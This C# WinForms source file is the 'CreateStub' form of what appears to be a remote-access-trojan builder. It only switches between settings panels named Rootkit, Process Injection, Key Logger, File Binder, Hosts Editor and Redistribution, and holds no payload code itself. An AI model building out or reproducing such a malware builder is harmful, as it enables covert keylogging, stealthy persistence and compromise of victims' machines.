using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using PpRClientInterface.Controls;
using PpRClientInterface.Controls.Builder;

namespace PpRClientInterface.Forms
{
    public partial class CreateStub : Form
    {
        public CreateStub()
        {
            InitializeComponent();
            VistaControls.VistaConstants.SetWindowTheme(OptionsTreeView.Handle, "explorer", null);
            OptionsTreeView.ExpandAll();
        }
        private void CreateStubs_Load(object sender, EventArgs e)
        {
            TreeNode treeNode = OptionsTreeView.Nodes[0];
            OptionsTreeView.SelectedNode = treeNode;
        }

        private void OptionsTreeView_AfterSelect(object sender, TreeViewEventArgs e)
        {
            #region Treeview Control Selecter
            if (OptionsTreeView.SelectedNode != null)
            {

                /*
                var General = new General();
                General.Dock = DockStyle.Fill;
                panel1.Controls.Add(General);
                */

                panel1.Controls.Clear();
                if (e.Node.Text == "General")
                {
                    var General = new create_stub_General();
                    General.Dock = DockStyle.Fill;
                    panel1.Controls.Add(General);
                }
                else if (e.Node.Text == "Connections")
                {
                    var Connections = new create_stub_Connections();
                    Connections.Dock = DockStyle.Fill;
                    panel1.Controls.Add(Connections);
                }
                else if (e.Node.Text == "Permissions")
                {
                    var Permissions = new create_stub_Permissions();
                    Permissions.Dock = DockStyle.Fill;
                    panel1.Controls.Add(Permissions);
                }
                else if (e.Node.Text == "Installation")
                {
                    var Installation = new create_stub_Installation();
                    Installation.Dock = DockStyle.Fill;
                    panel1.Controls.Add(Installation);
                }
                else if (e.Node.Text == "Safe Mode")
                {
                    var SafeMode = new create_stub_SafeMode();
                    SafeMode.Dock = DockStyle.Fill;
                    panel1.Controls.Add(SafeMode);
                }
                else if (e.Node.Text == "Display Message Box")
                {
                    var DisplayMsgBox = new create_stub_DisplayMsgBox();
                    DisplayMsgBox.Dock = DockStyle.Fill;
                    panel1.Controls.Add(DisplayMsgBox);
                }
                else if (e.Node.Text == "Rootkit")
                {
                    var Rootkit = new create_stub_Rootkit();
                    Rootkit.Dock = DockStyle.Fill;
                    panel1.Controls.Add(Rootkit);
                }
                else if (e.Node.Text == "Redistribution")
                {
                    var Redistribution = new create_stub_Redistribution();
                    Redistribution.Dock = DockStyle.Fill;
                    panel1.Controls.Add(Redistribution);
                }
                else if (e.Node.Text == "Process Injection")
                {
                    var ProcessInjection = new create_stub_ProcessInjection();
                    ProcessInjection.Dock = DockStyle.Fill;
                    panel1.Controls.Add(ProcessInjection);
                }
                else if (e.Node.Text == "Black List")
                {
                    var BlackList = new create_stub_BlackList();
                    BlackList.Dock = DockStyle.Fill;
                    panel1.Controls.Add(BlackList);
                }
                else if (e.Node.Text == "Hosts Editor")
                {
                    var HostsEditor = new create_stub_HostsEditor();
                    HostsEditor.Dock = DockStyle.Fill;
                    panel1.Controls.Add(HostsEditor);
                }
                else if (e.Node.Text == "Key Logger")
                {
                    var KeyLogger = new create_stub_ActiveKeyLogger();
                    KeyLogger.Dock = DockStyle.Fill;
                    panel1.Controls.Add(KeyLogger);
                }
                else if (e.Node.Text == "Add Plugins")
                {
                    var AddPlugins = new create_stub_AddPlugins();
                    AddPlugins.Dock = DockStyle.Fill;
                    panel1.Controls.Add(AddPlugins);
                }
                else if (e.Node.Text == "File Binder")
                {
                    var FileBinder = new create_stub_FileBinder();
                    FileBinder.Dock = DockStyle.Fill;
                    panel1.Controls.Add(FileBinder);
                }
                else if (e.Node.Text == "Choose Icon")
                {
                    var ChooseIcon = new create_stub_ChooseIcon();
                    ChooseIcon.Dock = DockStyle.Fill;
                    panel1.Controls.Add(ChooseIcon);
                }
                else if (e.Node.Text == "Assembly Binding")
                {
                    var AssemblyBinding = new create_stub_AssemblyBinding();
                    AssemblyBinding.Dock = DockStyle.Fill;
                    panel1.Controls.Add(AssemblyBinding);
                }
                else if (e.Node.Text == "Overview")
                {
                    var Overview = new create_stub_Overview();
                    Overview.Dock = DockStyle.Fill;
                    panel1.Controls.Add(Overview);
                }
                else if (e.Node.Text == "Build Finalization")
                {
                    var BuildFinalization = new create_stub_BuildFinalization();
                    BuildFinalization.Dock = DockStyle.Fill;
                    panel1.Controls.Add(BuildFinalization);
                }
                else if (e.Node.Text == "Profile Manager")
                {
                    var ProfileManager = new ProfileManager();
                    ProfileManager.ShowDialog(this);
                    ProfileManager.Dispose();
                }

            }
        #endregion
        }

    }
}
